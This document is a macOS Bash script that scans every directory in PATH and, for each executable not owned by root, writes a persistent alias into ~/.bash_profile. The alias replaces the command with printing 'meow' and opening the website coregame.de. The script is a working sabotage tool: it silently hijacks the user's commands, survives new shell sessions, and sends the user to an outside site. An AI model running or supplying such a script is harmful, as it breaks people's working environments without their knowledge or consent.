#!/bin/bash

add_alias() {
    local alias_command="$1"
    local alias_file="$2"
    if ! grep -qF "$alias_command" "$alias_file"; then
        echo "$alias_command" >> "$alias_file"
    fi
}

# Use ~/.bash_profile for Bash on macOS
alias_file=~/.bash_profile
touch "$alias_file"

IFS=":" read -r -a path_dirs <<< "$PATH"

for dir in "${path_dirs[@]}"; do
    if [ -d "$dir" ]; then
        for file in "$dir"/*; do
            [ -e "$file" ] || continue
            # Only alias if the current user can execute it and it's not a directory
            if [ -x "$file" ] && [ ! -d "$file" ]; then
                # Optionally, skip files owned by root (user id 0)
                owner_uid=$(stat -f "%u" "$file")
                if [ "$owner_uid" -ne 0 ]; then
                    exec_name=$(basename "$file")
                    add_alias "alias $exec_name='printf \"meow\n\" && open \"https://coregame.de\"'" "$alias_file"
                    echo "Added alias for: $exec_name"
                fi
            fi
        done
    fi
done

# Source the profile to activate aliases
source "$alias_file"
